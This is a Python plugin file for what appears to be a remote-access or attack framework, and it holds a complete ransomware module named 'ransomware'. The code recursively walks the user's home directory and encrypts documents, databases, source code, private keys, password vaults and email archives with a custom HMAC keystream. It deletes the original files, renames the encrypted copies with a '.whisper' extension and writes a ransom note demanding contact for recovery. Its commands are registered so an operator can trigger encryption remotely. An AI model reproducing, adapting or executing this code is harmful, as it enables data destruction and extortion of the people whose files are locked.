PLUGIN = {"name": "ransomware", "desc": "File encryption/ransomware module - encrypt files with AES-like cipher", "deps": [], "size": 4.0}

STUB_CODE = r'''
import os, base64, hashlib, hmac, struct, time

_RANSOM_EXT = ".whisper"
_RANSOM_NOTE = "README_DECRYPT.txt"
_RANSOM_NOTE_TEXT = "YOUR FILES HAVE BEEN ENCRYPTED\n\nAll your documents, databases, images and other important files have been encrypted with a strong cipher.\nTo recover your files, contact the administrator.\nYour unique ID: {victim_id}\n\nDO NOT attempt to decrypt files yourself - this will result in permanent data loss.\n"

_TARGET_EXTS = [".pdf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".txt",".csv",
                ".jpg",".jpeg",".png",".bmp",".gif",".tiff",
                ".zip",".rar",".7z",".tar",".gz",
                ".py",".js",".ts",".java",".cpp",".c",".cs",".php",".rb",".go",
                ".sql",".db",".sqlite",".mdb",".accdb",
                ".pem",".key",".ovpn",".kdbx",
                ".eml",".msg",".pst",
                ".mp3",".mp4",".avi",".mkv",
                ".dwg",".dxf",".psd",".ai",".indd",
                ".config",".env",".yml",".yaml",".json",".xml"]

def _ransom_encrypt_file(fpath, key):
    try:
        with open(fpath, "rb") as f:
            plain = f.read()
        if not plain: return False
        # Encrypt using derived key stream
        iv = os.urandom(16)
        ks, ctr = b"", 0
        while len(ks) < len(plain):
            ks += hmac.new(key, iv + struct.pack(">Q", ctr), hashlib.sha256).digest()
            ctr += 1
        ct = bytes(p ^ k for p, k in zip(plain, ks))
        tag = hmac.new(key, iv + ct, hashlib.sha256).digest()[:16]
        enc_data = iv + tag + ct
        os.remove(fpath)
        with open(fpath + _RANSOM_EXT, "wb") as f:
            f.write(enc_data)
        return True
    except: return False

def _ransom_decrypt_file(fpath, key):
    try:
        if not fpath.endswith(_RANSOM_EXT): return False
        with open(fpath, "rb") as f:
            data = f.read()
        if len(data) < 32: return False
        iv, tag, ct = data[:16], data[16:32], data[32:]
        if not hmac.compare_digest(tag, hmac.new(key, iv + ct, hashlib.sha256).digest()[:16]):
            return False
        ks, ctr = b"", 0
        while len(ks) < len(ct):
            ks += hmac.new(key, iv + struct.pack(">Q", ctr), hashlib.sha256).digest()
            ctr += 1
        plain = bytes(p ^ k for p, k in zip(ct, ks))
        orig_path = fpath[:-len(_RANSOM_EXT)]
        os.remove(fpath)
        with open(orig_path, "wb") as f:
            f.write(plain)
        return True
    except: return False

def _ransom_walk(start_dir, key, encrypt=True, exts=None, max_files=100):
    encrypted = 0
    skipped = 0
    target_exts = exts or _TARGET_EXTS
    start_dir = os.path.abspath(start_dir)
    skip_dirs = {os.path.join(start_dir, d) for d in ["Windows", "Winnt", "$Recycle.Bin", "System32", "Program Files",
                                                       "Program Files (x86)", "ProgramData", "AppData",
                                                       "node_modules", ".git", ".svn", "__pycache__"]}
    for root, dirs, files in os.walk(start_dir):
        dirs[:] = [d for d in dirs if os.path.join(root, d) not in skip_dirs]
        for fname in files:
            fpath = os.path.join(root, fname)
            if encrypt:
                ext = os.path.splitext(fname)[1].lower()
                if ext in target_exts and not fname.startswith(".") and ext != _RANSOM_EXT:
                    if _ransom_encrypt_file(fpath, key):
                        encrypted += 1
                        if encrypted >= max_files: return encrypted, skipped
            else:
                if fname.endswith(_RANSOM_EXT):
                    if _ransom_decrypt_file(fpath, key):
                        encrypted += 1
                        if encrypted >= max_files: return encrypted, skipped
            if encrypted >= max_files: break
    return encrypted, skipped

def _cmd_ransom_encrypt(m):
    try:
        password = m.get("password", "ransom_key_whisper")
        key = hashlib.sha256(password.encode()).digest()
        root = m.get("path", os.path.expanduser("~"))
        max_files = min(m.get("max", 50), 500)
        exts = m.get("extensions", None)
        if exts: exts = [e.strip() if e.startswith(".") else "." + e.strip() for e in exts.split(",")]
        count, _ = _ransom_walk(root, key, encrypt=True, exts=exts, max_files=max_files)
        # Write ransom note
        note_path = os.path.join(root, _RANSOM_NOTE)
        victim_id = hashlib.md5((password + str(time.time())).encode()).hexdigest()[:8]
        try:
            with open(note_path, "w") as f:
                f.write(_RANSOM_NOTE_TEXT.format(victim_id=victim_id))
        except: pass
        return {"output": f"[+] Ransomware: Encrypted {count} files in {root}\n    Note: {note_path}\n    Key: {password} (keep this for decryption)"}
    except Exception as e: return {"output": f"[!] Ransomware error: {e}"}

def _cmd_ransom_decrypt(m):
    try:
        password = m.get("password", "ransom_key_whisper")
        key = hashlib.sha256(password.encode()).digest()
        root = m.get("path", os.path.expanduser("~"))
        max_files = min(m.get("max", 100), 500)
        count, _ = _ransom_walk(root, key, encrypt=False, max_files=max_files)
        return {"output": f"[+] Decrypted {count} files in {root}"}
    except Exception as e: return {"output": f"[!] Decrypt error: {e}"}

_CMDS["ransom_encrypt"] = _cmd_ransom_encrypt
_CMDS["ransom_decrypt"] = _cmd_ransom_decrypt
'''

def get_commands():
    return {"ransom_encrypt": "_cmd_ransom_encrypt", "ransom_decrypt": "_cmd_ransom_decrypt"}
